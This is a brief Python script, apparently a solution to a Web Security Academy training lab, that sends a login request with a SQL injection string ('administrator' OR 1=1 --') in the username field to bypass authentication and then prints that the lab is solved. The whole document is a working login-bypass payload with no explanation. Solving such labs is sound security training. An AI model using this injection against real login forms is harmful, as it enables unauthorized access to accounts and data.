import requests
url = "https://0aa9001f03c480f0b1d1085c002100ce.web-security-academy.net/login"
payload  = {
    "username" : "administrator' OR  1=1 --",
    "password" : """batman"""
}
response = requests.post(url=url, data=payload)
print("you solve the lab")